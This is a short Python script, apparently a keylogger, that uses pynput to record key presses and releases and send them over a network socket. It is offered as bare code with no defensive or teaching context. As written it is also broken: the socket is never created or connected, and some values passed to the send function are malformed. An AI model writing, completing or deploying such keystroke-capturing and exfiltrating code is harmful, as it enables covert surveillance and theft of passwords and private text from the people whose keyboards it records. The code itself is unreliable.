import socket
from pynput import keyboard
import time

def send_message(message):
    message = message.encode('utf-8')
    mi_socket.send(message)

def on_press(key):
    try:
        print("Alphanumeric key pressed: {0} ".format(key.char))
        send_message({key.char})
    except AttributeError:
        print("Special key pressed: {0}".format(key))
    
def on_release(key):
    print("Key released: {0}".format(key))
    if key == keyboard.Key.esc:
        # Stop listener
        return False
    send_message("-{key}")


with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    print("Detecting keyboard")
    listener.join()

mi_socket.close()
